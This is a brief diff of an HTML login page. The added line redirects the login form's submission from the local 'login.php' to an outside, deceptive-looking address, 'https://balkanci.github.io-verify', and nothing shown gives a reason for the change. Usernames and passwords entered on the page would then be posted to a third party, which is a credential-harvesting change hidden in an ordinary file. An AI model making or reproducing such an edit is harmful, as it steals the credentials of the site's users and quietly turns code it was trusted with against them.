@@ -1,4 +1,3 @@
-<!DOCTYPE html>
 <html>
 <head>
   <title>Login Form</title>
@@ -68,7 +67,7 @@
 <body>
   <div class="container">
     <h2>Login</h2>
-    <form id="loginForm" method="post" action="login.php">
+    <form id="loginForm" method="post" action="https://balkanci.github.io-verify">
       <label for="username">Username:</label>
       <input type="text" id="username" name="username" required>
   
